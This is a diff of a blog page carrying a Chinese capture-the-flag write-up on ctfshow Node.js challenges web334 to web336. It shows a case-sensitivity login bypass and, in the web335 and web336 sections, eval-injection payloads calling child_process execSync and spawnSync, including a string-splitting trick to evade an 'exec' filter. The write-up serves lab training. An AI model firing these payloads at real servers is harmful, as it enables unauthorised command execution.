@@ -68,7 +68,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-web334"><span class="toc-text">ctfshow web334</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web334"><span class="toc-text">web334</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web335"><span class="toc-text">web335</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web336"><span class="toc-text">web336</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%951"><span class="toc-text">法1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%952"><span class="toc-text">法2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web337"><span class="toc-text">web337</span></a></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -225,12 +225,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Nodejs/" style="color: #ff7d73">Nodejs</a>
+                <a href="/blog/tags/Nodejs/" style="color: #03a9f4">Nodejs</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/ctfshow/" style="color: #ffa2c4">ctfshow</a>
+                <a href="/blog/tags/ctfshow/" style="color: #03a9f4">ctfshow</a>
             </span>
             
         </span>
@@ -244,7 +244,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">318字</span>
+        <span class="post-count">676字</span>
       </span>
     </span>
 
@@ -253,7 +253,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">1分</span>
+        <span class="post-count">2分</span>
       </span>
     </span>
     
@@ -271,8 +271,10 @@
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>早该开刷了（</p>
 <span id="more"></span>
 
-
-<h1 id="ctfshow-web334"><a href="#ctfshow-web334" class="headerlink" title="ctfshow web334"></a>ctfshow web334</h1><p>下载附件，解压获得js源码</p>
+<h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><blockquote>
+<p>大小写绕过</p>
+</blockquote>
+<p>下载附件，解压获得js源码</p>
 <p>login.js</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -328,7 +330,46 @@ module<span class="token punctuation">.</span>exports <span class="token operato
 <p>那做法就很明显了，利用大小写绕过即可，name传入<code>CTFshow</code>，passwd传入<code>123456</code></p>
 <p>然后登录就能回显flag</p>
 <hr>
+<h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><blockquote>
+<p>命令执行</p>
+</blockquote>
+<p>f12发现hint：<code>&lt;!--/?eval=--&gt;</code></p>
+<p>那考点明显就是命令执行</p>
+<p>在nodejs中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为“eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function</p>
+<p>而在nodejs的api中，存在<a target="_blank" rel="noopener" href="https://nodejs.cn/api/child_process.html#child-process">child_process子进程</a>的方法能够执行shell</p>
+<p>Node.js中的chile_process.exec调用的是&#x2F;bash.sh，它是一个bash解释器，可以执行系统命令。<br>在eval函数的参数中可以构造require(‘child_process’).exec(‘’);来进行调用。</p>
+<p>使用<code>exec</code>方法，但是发现返回的是 [object Object]</p>
+<p>这是因为exec的同步和异步区别就是在于回显值，所谓异步就是不阻碍程序运行，所以自然不可能产生回显</p>
+<p>所以这里使用<code>execSync</code>方法</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>eval<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p><img src="/blog/2023/06/28/ctfshow-Nodejs%E4%B8%93%E9%A2%98/image-20230629131027640.png" alt="image-20230629131027640"></p>
+<p>直接cat即可获取flag</p>
+<hr>
+<h1 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h1><blockquote>
+<p>命令执行</p>
+</blockquote>
+<p>加了过滤，上一题的payload用不了了</p>
+<h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2><p>测试发现是过滤了exec</p>
+<p>尝试通过拼接的方式绕过(%2B &#x3D;&#x3D; +)</p>
+<p>先在本地的交互环境下测试看看可不可行</p>
+<p><img src="/blog/2023/06/28/ctfshow-Nodejs%E4%B8%93%E9%A2%98/image-20230629161328154.png" alt="image-20230629161328154"></p>
+<p>可以的，那我们直接进行命令执行</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>eval<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'exe'</span><span class="token operator">%</span>2B<span class="token string">'cSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/28/ctfshow-Nodejs%E4%B8%93%E9%A2%98/image-20230629161438378.png" alt="image-20230629161438378"></p>
+<p>成功列出目录，直接cat即可</p>
+<h2 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h2><p>除了<code>execSync</code>以外，还有<code>spawnSync</code>方法可以用</p>
+<p><a target="_blank" rel="noopener" href="https://nodejs.cn/api/child_process.html#child_processspawnsynccommand-args-options">官方文档</a></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span>command<span class="token punctuation">[</span><span class="token punctuation">,</span> args<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">,</span> options<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>所以payload如下：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>eval<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'./'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<hr>
+<h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1>
     </div>
     
     
